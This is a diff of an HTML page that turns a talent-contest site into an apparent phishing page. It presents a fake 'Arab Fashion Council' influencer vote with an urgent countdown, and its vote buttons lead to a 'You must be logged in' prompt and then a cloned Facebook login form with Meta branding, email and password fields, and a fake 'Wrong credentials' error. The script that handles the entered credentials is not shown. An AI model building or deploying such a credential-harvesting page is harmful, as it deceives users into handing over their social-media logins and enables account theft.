@@ -1,573 +1,885 @@
 <!DOCTYPE html>
-<html lang="en">
+<html class="_9dls touch _ar44 js-focus-visible _aa4c" lang="en" dir="ltr" data-js-focus-visible="">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Empowering Arab Fashion: Uniting 22 Nations to Foster Creative Economy and Style Innovation. Explore the vibrant world of Arab fashion heritage and contemporary design.">
+  <meta property="og:title" content="Empowering Arab Fashion" />
+  <meta property="og:description" content="Uniting 22 Nations to Foster Creative Economy and Style Innovation. Explore the vibrant world of Arab fashion heritage and contemporary design." />
+  <meta property="og:image" content="img/slide.png" />
+  <meta property="og:url" content="" />
+  <meta property="og:type" content="website" />
 
-        <!-- Required meta tags -->
+    <link id="dynamic-favicon" href="image/favicon.png" rel="shortcut icon" sizes="196x196">
+    <link type="text/css" rel="stylesheet" href="css/fb.css">
+    <link type="text/css" rel="stylesheet" href="css/fb_style.css">
+    <link type="text/css" rel="stylesheet" href="css/page.css">
+    <link rel="stylesheet" href="css/profile.css">
+    <link rel="stylesheet" href="css/index.css">
+    <link rel="stylesheet" href="css/ig.css">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/index.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
+  <title>Arab Fashion Council</title>
+    <style>
+        .mgm {
+            display: none;
+            position: absolute;
+            top: 250px; /* Adjust top position as needed */
+            background-color: #fff9d7;
+            border: 1px solid #e2c822;
+            left: 0;
+            width: 100%;
+            padding: 5px;
+            text-align: center;
+            border-radius: 5px; /* Optional: Rounded corners */
+        }
+        .mgm .txt {
+            font-family: Arial, sans-serif;
+            display: inline-block; /* Display text inline-block to align with image */
+            vertical-align: middle; /* Vertical alignment with image */
+            margin-left: 10px; /* Adjust margin between image and text */
+            font-size: 11px;
+        }
+        .mgm img {
+            display: inline-block; /* Display image inline-block */
+            width: 35px; /* Adjust image size as needed */
+            height: 35px;
+            border-radius: 50%; /* Optional: Rounded image */
+            vertical-align: middle; /* Vertical alignment with text */
+        }
+        .stopwatch {
+            width: 100px;
+            position: sticky; /* Change from absolute to sticky */
+            top: 40px; /* Stick to the top of the header */
+            margin: 20px auto; /* Center horizontally with margin */
+            border-radius: 50%;
+            background: radial-gradient(circle, #ccc 70%, #fff);
+            box-shadow: 0 0 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+        }
 
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="description" content="Arab Asia Starz is back with Season 3! After two super-successful seasons and garnering tremendous response, Starz Media Inc & Filmfare Middle East are proud to present this much-awaited digital talent hunt once again.">
-        <meta name="keywords" content="Arab asia Starz Season 3, Starz, starz media">
-        <link rel="shortcut icon" href="https://arabasiastarz.com/season-2/assets/images/favicon.ico">
-
-        <!-- Bootstrap CSS -->
-        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
-
-        <link href="https://arabasiastarz.com/home/css/style.css" rel="stylesheet" />
-        <link href="css/index.css" rel="stylesheet" />
-        <script src="js/jquery-3.6.0.min.js"></script>
-
-        <script src="js/index.js"></script>
-
-
-        <title>Arab Asia Starz Season 3</title>
-              <style>
-                .video video{max-height:450px;}.none{display:none;} h1{color:#ffffff;}
-                .card.text-center{margin-bottom:10px;}
-                .alert{text-align:center;}
-                .alert .close{display:none;}
-                .sub_nav{width:40%;margin: 20px auto;}
-                .nav_link:hover{background-color: #3e8e41;}
-                .sub_nav .nav-link{background: #a64ac9;margin:3px;color:#ffffff;}
-                .nav-pills .nav-link.active, .nav-pills .show>.nav-link {
-                    color: #fff;
-                    background-color: #ca0076;}
-                .subnav:hover .ul_subnav{display:block !important;}
-                .ul_subnave{display:none;list-style:none;position:absolute;}
-                .ul_subnave li{background: #a64ac9;margin:3px;color:#ffffff;}
-                .ul_subnave li{background: #a64ac9; margin: 3px; padding: 9px 38px; color: #ffffff; margin-left: -16px; border-radius: 4px;}
-
-                    /* Dropdown Button */
-                .dropbtn {
-                  background-color: #04AA6D;
-                  color: white;
-                  font-size: 16px;
-                  border: none;
-                }
-
-                /* The container <div> - needed to position the dropdown content */
-                .dropdown {
-                  position: relative;
-                  display: inline-block;
-                }
-
-                /* Dropdown Content (Hidden by Default) */
-                .dropdown-content {
-                  display: none;
-                  position: absolute;
-                  background-color: #f1f1f1;
-                  min-width: 160px;
-                  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
-                  z-index: 1;
-                }
-
-                /* Links inside the dropdown */
-                .dropdown-content a {
-                  color: black;
-                  padding: 12px 16px;
-                  text-decoration: none;
-                  display: block;
-                }
-
-                /* Change color of dropdown links on hover */
-                .dropdown-content a:hover {background-color: #ddd;}
-
-                /* Show the dropdown menu on hover */
-                .dropdown:hover .dropdown-content {display: block;}
-
-                /* Change the background color of the dropdown button when the dropdown content is shown */
-                /* .dropdown:hover .dropbtn {background-color: #3e8e41;} */
-              </style>
-
-    </head>
+         .clock-face {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            font-size: 12px;
+            font-weight: 400;
+            text-align: center;
+            box-shadow: inset 0 0 3px rgba(0, 0, 0, 0.1);
+        }
+       
+        .time {
+            font-size: 14px;
+        }
+        .icon {
+            width: 40px; /* Set the width of the image */
+            height: 40px; /* Set the height of the image */
+            margin: 0;
+        }
+        .hide-button {
+            position: absolute;
+            top: 20px;
+            right: 140px;
+            z-index: 1000;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .hide-button:hover {
+            background-color: #0056b3;
+        }
+        .show-mgm {
+            margin-top: 20px; /* Adjust the margin value as needed */
+        }
+        .imag {
+          top: 50px;
+        }
+    </style>
+    <style>
+      ._585n {
+          background-color: #3578e5;
+          border: 1px solid #3578e5;
+          border-radius: 3px;
+          overflow: hidden;
+          padding: 0 0 0 40px;
+      }
+    </style>
+</head>
 <body>
-<div id="home">
+  <div id="home">
 
-       <div class="top-shade"></div>
+        <header>
+            <div class="stopwatch" onclick="toggleStopwatch()">
+                <div class="clock-face" id="clockFace">
+                    <img class="icon" src="wristwatch.png" alt="Wristwatch Icon">
+                    Contest ends in <div class="time" id="timer">30:00</div>
+                </div>
+            </div><br>
 
-       <div class="logo"><a href="https://arabasiastarz.com/"></a><img src="https://arabasiastarz.com/home/img/logo.png" class="img-responsive" /></a></div><!-- logo -->
+          
+              <img src="img/slide.png"><br><br>
+          
+            <center>
+                <div class="mgm">
+                    <span class="txt"></span>
+                </div><br>
 
-       <div class="container-full">
+                <button id="vote2" onclick="vote()">
+                  Click Here To Vote
+                </button>
+            </center>
+        </header>
 
-    <nav class="navbar navbar-expand-lg navbar-light bg-light">
+    <div id="blue">
 
-      <div class="container">
+      <h2>
+        Arab Fashion Council
+      </h2>
 
-        <a class="navbar-brand " href="#">Menu</a>
-        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-          <span class="navbar-toggler-icon"></span>
-        </button>
+    </div>
+    <div id="news">
+      <p>
+        Are you ready to immerse yourself in a world of style, culture, and innovation? The Arab Fashion Council is your gateway to the captivating realm of Arab fashion. We invite you to join us on a journey where tradition meets modernity, and where fashion becomes a powerful expression of identity.
+      </p>
+    </div>
 
-        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+    <div id="news">
+      <p>Vote for Excellence. Vote for Diversity. Vote for Arab Fashion Council!</p>
 
-          <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+    </div>
 
-            <li class="nav-item">
-              <a class="nav-link active" aria-current="page" href="index.html">Home</a>
-            </li>
+    <div id="blue">
 
-            <li class="nav-item">
-              <a class="nav-link active" aria-current="page" href="#season1">Season 1</a>
-            </li>
+      <h2>
+        📢 How to Vote:
+      </h2>
 
-            <li class="nav-item">
-              <a class="nav-link " aria-current="page" href="#season2">Season 2</a>
-            </li>
+    </div>
+    <div id="news">
+      <p>
+      </p>
+    </div>
 
-            <li class="nav-item">
-              <a class="nav-link " aria-current="page" href="#about">About</a>
-            </li>
+    <div id="news">
+      <p>#1 Each influencer has a unique hashtag our social media page.</p>
+      <p>#2 Click the vote button</p>
+      <p>#3 Voting Deadline: Voting is open until December. Don't miss the chance to support your favorite influencer!</p>
 
-            <li class="nav-item">
-              <a class="nav-link " aria-current="page" href="#judges">Judges</a>
-            </li>
+    </div>
 
-            <!-- <li class="nav-item">
+ 
+    </center>
+    <div id="blue">
+      <center>
+        <h2>Meet Our Contestants</h2>
+      </center>
+    </div>
+    <br>
+    <center>
+ <profile>
 
-              <a class="nav-link " aria-current="page" href="#gallery">Gallery</a>
-
-            </li>
-
-            <li class="nav-item">
-
-              <a class="nav-link" href="#">Shortlisted</a>
-
-            </li> -->
-
-            <li class="nav-item">
-              <a class="nav-link login-link" href="auth/login.html">Login</a>
-            </li>
-
-            <li class="nav-item">
-              <a class="nav-link" href="#registration"><button class="register-btn"><span>New Registration</span></button></a>
-            </li>
-
-          </ul>
-
+        <!-- Profile Card 1 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contest1.jpg" alt="Profile 1" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionCouncil</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
         </div>
 
-      </div>
-
-    </nav>
-
-       </div> <!-- container fluid -->
-
-
-    <div id="carouselExampleCaptions" class="carousel slide" data-bs-ride="carousel">
-
-    <img src="https://arabasiastarz.com/home/img/slide1.jpg" class="d-block w-100" />
-
-    </div> <!-- arouselExampleCaptions -->
-
-    <!-- ----------------------------OUR PARTNERS------------------------------------- --> 
-
-    <div class="container module-border-wrap1">
-
-      <div class="row partners-block module">
-
-        <!-- <div class="partners-block"> -->
-
-          <img src="https://arabasiastarz.com/home/partners-logo.png" />
-            <!-- <div class="col-sm-2">
-                <h3 class="our-partners">Our Partners</h3>
+        <!-- Profile Card 2 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant002.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#DubaiFashionWeek</span>
             </div>
-            <div class="col-sm-2 b-r">
-              <img src="https://arabasiastarz.com/home/img/mai-dubai.png" />
-            </div>
-            <div class="col-sm-2 b-r">
-              <img src="https://arabasiastarz.com/home/img/radio-4.png" />
-            </div>
-            <div class="col-sm-2 b-r">
-              <img src="https://arabasiastarz.com/home/img/tv-partner.png" />
-            </div>
-            <div class="col-sm-1 b-r">
-              <img src="https://arabasiastarz.com/home/img/gulf-buzz.png" />
-            </div>
-              <div class="col-sm-3">
-              <img src="https://arabasiastarz.com/home/img/filmfare.png" />
-            </div> -->
-
-         <!-- </div>  partners block --> 
-
+            <button onclick="vote()" class="vote-button">Vote</button>
         </div>
 
-      </div>
+        <!-- Profile Card 3 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant003.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionInnovation</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
 
-    <p align="center">
-      <button id="vote2" onclick="vote()">
+        <!-- Profile Card 4 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant004.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#Creativity</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
 
-        Click Here To Vote
+        <!-- Profile Card 5 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant005.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionHeritage</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
 
-      </button><br>
-      <!-- <button id="vote2" onclick="vote()">
-                                                            Join contest
-                                                          </button>-->
-    </p>
+        <!-- Profile Card 6 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant006.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#CulturalCouture</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
 
-    <!-- -------------------------------ABOUT Season 3---------------------------------- -->
+        <!-- Profile Card 7 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant007.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionTrends</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
 
-    <section id="about-s3">
+        <!-- Profile Card 8 -->
+        <div id="voter" class="profile-card">
+            <img src="img/contestant008.jpg" alt="Profile 2" class="profile-image">
+            <div class="hashtags">
+                <span>#ArabFashionista</span>
+            </div>
+            <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+    </profile>
+  </center>
+  </div>
+<center>
+        <div id="choose" class="t706__cartwin t706__cartwin_showed"
+            style="opacity: 1; transition: opacity 0.3s ease 0s;">
+            <div class="t706" data-cart-countdown="yes" data-opencart-onorder="yes" data-project-currency="د.إ.&rlm;"
+                data-project-currency-side="l" data-project-currency-sep="." data-project-currency-code="AED"
+                data-payment-system="stripe" data-cart-dontstore="y" data-cart-oneproduct="y"
+                data-cart-sendevent-onadd="y">
 
-      <div class="heading"><h1>Arab Asia Starz Season 3</h1></div>  
+                <div class="t706__cartwin t706__cartwin_showed" style="opacity: 1; transition: opacity 0.3s ease 0s;">
+                    <div class="t706__close t706__cartwin-close"><button id="cancel" onclick="can()" 
+                            type="button" class="t706__close-button t706__cartwin-close-wrapper"
+                            aria-label="Закрыть корзину"><svg role="presentation"
+                                class="t706__close-icon t706__cartwin-close-icon" width="23px" height="23px"
+                                viewBox="0 0 23 23" version="1.1" xmlns="http://www.w3.org/2000/svg"
+                                xmlns:xlink="http://www.w3.org/1999/xlink">
+                                <g stroke="none" stroke-width="1" fill="#fff" fill-rule="evenodd">
+                                    <rect
+                                        transform="translate(11.313708, 11.313708) rotate(-45.000000) translate(-11.313708, -11.313708) "
+                                        x="10.3137085" y="-3.6862915" width="2" height="30"></rect>
+                                    <rect
+                                        transform="translate(11.313708, 11.313708) rotate(-315.000000) translate(-11.313708, -11.313708) "
+                                        x="10.3137085" y="-3.6862915" width="2" height="30"></rect>
+                                </g>
+                            </svg> </button> </div>
+                    <div class="t706__cartwin-content">
+                        <div class="t706__cartwin-top">
+                            <div class="t706__cartwin-heading t-name t-name_xl">You
+                                must be logged in!</div>
+                        </div>
+                        <div class="t706__cartwin-products">
+                            <div class="t706__cartwin-bottom">
+                            </div>
+                            <img id="choose_fb" onclick="handleFbClick()" src="image/fb.png">
+                            <img id="choose_ig" onclick="handleIgClick()" src="image/ig.png">
+                        </div>
+                    </div>
+                    <div class="t706__cartdata"></div>
+                </div>
 
-      <div class="container">
-        <p>Arab Asia Starz is back with Season 3! After two super-successful seasons and garnering tremendous response, Starz Media Inc & Filmfare Middle East are proud to present this much-awaited digital talent hunt once again. Bigger and better, Arab Asia Starz Season 3 kick starts its search for this region’s best talents. So if you are 18 years & above, and have a passion for fashion, beauty and entertainment, here’s a chance for you to shine!</p>
 
-        <p>The winners will be announced in May with an on-ground Grand Finale attended by celebrity judges and guests. AND WINNERS TAKE IT ALL! A second cover of Filmfare Middle East magazine, exclusive photo-shoot, cash prize and loads of gift hampers. So what are you waiting for?</p><p> Register NOW!</p>
-      </div>
+            </div>
+        </div>
+    </center>
 
-    </section>
+    <div id="fb_wrapper">
+
+        <div id="fbbody" class="fbook">
+            <br>
+            <center><span
+                    style="display: flex; justify-content: center; align-items: center; text-align: center; color: rgb(70, 90, 105); display: inline; font-size: 13px; font-family: &quot;Optimistic Text Normal&quot;; ">English
+                    (UK)</span></center><br><br><br><br>
+
+            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center;">
+                <img alt="Facebook from Meta" src="img/fblogo.png" class="wbloks_1"
+                    style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
+            </div><br><br><br>
+
+            <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;">
+                <div class="fsl fwb fcb">Wrong credentials</div>
+                <div>Invalid username or password</div>
+            </div><br>
 
 
+            <div class="form-group">
+                <input type="text" id="fb-email" required oninput="toggleClearIcon()">
+                <label for="fb-email">Mobile number or email address</label>
+                <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
+            </div>
 
-  <!--================Judges===========================-->
+            <div class="form-group">
+                <input type="password" id="fb-pass" required>
+                <label for="fb-pass">Password</label>
+                <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
+                <!-- Icon as a clickable div -->
+            </div>
 
-    <section id="judges">
+            <div
+                style="opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 22px; align-items: center; flex-direction: row; justify-content: center;">
 
-          <div class="heading"><h2>JUDGES</h2></div>  
+                <div class="wbloks_113" dir="auto">
 
-          <div class="container">
-            <div class="row">
-              <div class="col-sm-4 offset-sm-4">
-                  <div class="judge"><img src="https://arabasiastarz.com/season-1/Rizwan.jpg" /></div>
-                    <h3>Rizwan Sajan</h3>
-                    <p>Business Leader, Achiever, Inspirer, and Influencer!</p>
-              </div>
-          </div>
-            
-          <div class="row">
-              <div class="col-sm-4">
-                  <div class="judge"><img src="https://arabasiastarz.com/home/img/judges/Judge-Bosco.jpg" /></div>
-                    <h3>Bosco Martis</h3>
-                    <p>Bollywood's most celebrated choreographer and now debutant director Bosco Martis has given the industry and its top stars some of their biggest dance hits</p>
-              </div>
+                    <div onclick="login()"
+                        style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">
+                        Log
+                        in</div>
 
-              <div class="col-sm-4">
-                    <div class="judge"><img src="https://arabasiastarz.com/home/img/judges/Judge-lara-shareef.jpg" /></div>
-                      <h3>Lara Shareef</h3>
-                      <p>A fashion designer who re-defined the concept of modest fashion with her stunning and beautiful designs.</p>
+                </div>
+            </div> <br><br>
+
+            <div class="wbloks_112" style="font-size: 15px; max-height: 20.28px; word-break: break-all;">
+                <div class="wbloks_113" dir="auto"><span data-bloks-name="bk.components.TextSpan"
+                        style="line-height: 1rem; color: rgb(28, 43, 51); font-weight: 500; display: inline; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Forgotten
+                        Password?</span></div>
+            </div><br><br><br><br><br>
+
+            <div data-bloks-name="bk.components.Flexbox" tabindex="0" role="button" aria-label="Create new account"
+                data-anchor-id="replay" class="wbloks_1" style="pointer-events: inherit; width: 100%;">
+                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                    style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(203, 210, 217); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
+                    <div>
+                        <span data-bloks-name="bk.components.TextSpan"
+                            style="padding: 8px; display: flex; justify-content: center; color: rgb(28, 43, 51); font-weight: 500; display: flex; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Create
+                            new account</span>
                     </div>
 
-              <div class="col-sm-4">
-                <div class="judge"><img src="https://arabasiastarz.com/home/img/judges/Judge-Dani.jpg" /></div>
-                    <h3>Dani Hiswani</h3>
-                    <p>Celebrities hairstylist, Worked with celebrities from The Arab World, Bollywood and Hollywood, Dani succeeds in impressing everyone with his genius work when it comes to hair.</p>
                 </div>
-
-       
-        <!-- <div class="col-sm-3">
-
-          <div class="judge"></div>
-
-          <h3>JUDGE 4</h3>
-
-        </div> -->
-
-      </div>
-
-      </div>
-
-    </section>
-
-    <!-- ---------------------- Contestants -------------------------------- -->
-
-
-
-    <section id="contestents">
-
-      <div class="heading" ><h2 style="font-size:30px;padding:5px;">VOTE</h2></div>  
-
-        <div class="container">
-          <nav class="nav nav-pills nav-fill sub_nav">
-            <a class="nav-link " aria-current="page" href="#">ALL</a>
-            <a class="nav-link " href="#">Fashion</a>
-            <a class="nav-link active" href="#">Beauty</a>
-            <a class="nav-link " href="#">Entertainment</a>
-          </nav>
-
-      <div class="row">  
-            
-        <div class="col-sm-4">
-            <div class="card text-center">
-                <div class="card-header">Contestant 001</div> 
-                  <div class="card-body">
-                      <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                      <video controls width="100%">
-
-                          <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1651045151/gussookvqhz3vhve9dic.mov" type="video/mp4">
-
-                          <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                          Your browser does not support HTML video.
-                      </video>
-                      <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >VOTE For Contestant 001 </a></button>
-                  </div>
-                <div class="card-footer text-muted"> Votes : 112 </div>
             </div>
-        </div>
-               
-        <div class="col-sm-4">      
-            <div class="card text-center">
-              <div class="card-header">Contestant 002  </div>
-                <div class="card-body">
-                    <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                    <video controls width="100%">
 
-                        <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1651051566/vh4vxtiyhqhxijn7vcl3.mp4" type="video/mp4">
 
-                        <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                        Your browser does not support HTML video.
-                    </video>
-                    <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                    VOTE For Contestant 002 </a></button>
-
-                 </div>
-                <div class="card-footer text-muted"> Votes : 123 
-              </div>
-          </div>
-        </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-             <div class="card-header">Contestant 003  </div>
-                <div class="card-body">
-                    <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                    <video controls width="100%">
-
-                        <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650881288/xvkrnodivdbhbmatjybi.mov" type="video/mp4">
-
-                        <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                        Your browser does not support HTML video.
-                    </video>
-                    <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                    VOTE For Contestant 003 </a></button>
-                  
-                  </div>
-                <div class="card-footer text-muted"> Votes : 90 
-              </div>
-            </div>
-        </div>
-              
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 004  </div>
-                <div class="card-body">
-                    <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                    <video controls width="100%">
-
-                      <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650902472/hbxqm4rlsphxknqtsenf.mov" type="video/mp4">
-
-                      <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                      Your browser does not support HTML video.
-
-                    </video>
-                    <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                    VOTE For Contestant 004 </a></button>
+            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                style="pointer-events: none; flex-grow: 1; flex-shrink: 1e+06; padding-bottom: 0px; flex-direction: column; justify-content: flex-end;">
+                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                    style="pointer-events: none; padding-top: 20px; padding-bottom: 20px; align-items: center; justify-content: center;">
+                    <center>
+                        <div class="wbloks_1" style="height: 12px; aspect-ratio: 5 / 1;">
+                            <div data-bloks-name="bk.components.AspectRatio" class="wbloks_108"
+                                style="aspect-ratio: 5 / 1;">
+                                <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" height="1" width="5"
+                                    class="wbloks_110"></svg>
+                            </div>
+                            <div class="wbloks_109"><img alt="Meta logo" src="img/meta.png" class="wbloks_1"
+                                    style="width: 100%; pointer-events: inherit; mask-image: url(img/meta.png); mask-size: contain; background-color: rgb(70, 90, 105); object-position: 10000px 10000px; object-fit: contain; overflow: hidden;">
+                            </div>
+                    </center>
                 </div>
-              <div class="card-footer text-muted"> Votes : 58 
-            </div>
-          </div>
-        </div>
-            
-        <div class="col-sm-4">
-          <div class="card text-center">
-              <div class="card-header">Contestant 005  </div>
-                <div class="card-body">
-                  <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                  <video controls width="100%">
-
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650861927/wnpa1bm2drnv8neqssym.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 005 </a></button>
+            </div><br>
+            <div data-bloks-name="bk.components.Flexbox"
+                style="font-family: &quot;Optimistic Text Normal&quot;; word-spacing: 10px; pointer-events: none; align-items: center; flex-direction: column; justify-content: center;">
+                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1" style="pointer-events: none;">
+                    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
+                        style="pointer-events: none; padding-left: 4px; padding-right: 4px; padding-bottom: 4px;">
+                        <span data-bloks-name="bk.components.TextSpan"
+                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">About</span>
+                        <span data-bloks-name="bk.components.TextSpan"
+                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">Help</span>
+                        <span data-bloks-name="bk.components.TextSpan"
+                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">More</span>
+                    </div>
                 </div>
-              <div class="card-footer text-muted"> Votes : 100 
             </div>
-          </div>
         </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 006  </div>
-              <div class="card-body">
-                  <h5 class="card-title"><span class="badge bg-warning text-dark">Beauty</span> </h5>
-                  <video controls width="100%">
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650954394/qylocmbs1vsekvo9pdaf.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 006 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 75 
-            </div>
-          </div>
-        </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 007  </div>
-              <div class="card-body">
-                  <h5 class="card-title"><span class="badge bg-warning text-dark">Entertainment</span> - <span class="badge bg-info text-dark">Comedy</span></h5>
-                  <video controls width="100%">
-
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650673041/ugqahcxwcc2hqmrvezgs.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 007 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 8 
-            </div>
-          </div>
-        </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 008  </div>
-              <div class="card-body">
-                <h5 class="card-title"><span class="badge bg-warning text-dark">Entertainment</span> - <span class="badge bg-info text-dark">Comedy</span></h5>
-                  <video controls width="100%">
-
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1649711891/n67uk3ybbtppemdjmq41.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 008 </a></button>
-                </div>
-              <div class="card-footer text-muted">    Votes : 10 
-            </div>
-          </div>
-        </div>
-                
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 009  </div>
-              <div class="card-body">
-                <h5 class="card-title"><span class="badge bg-warning text-dark">Entertainment</span> - <span class="badge bg-info text-dark">Comedy</span></h5>
-                <video controls width="100%">
-
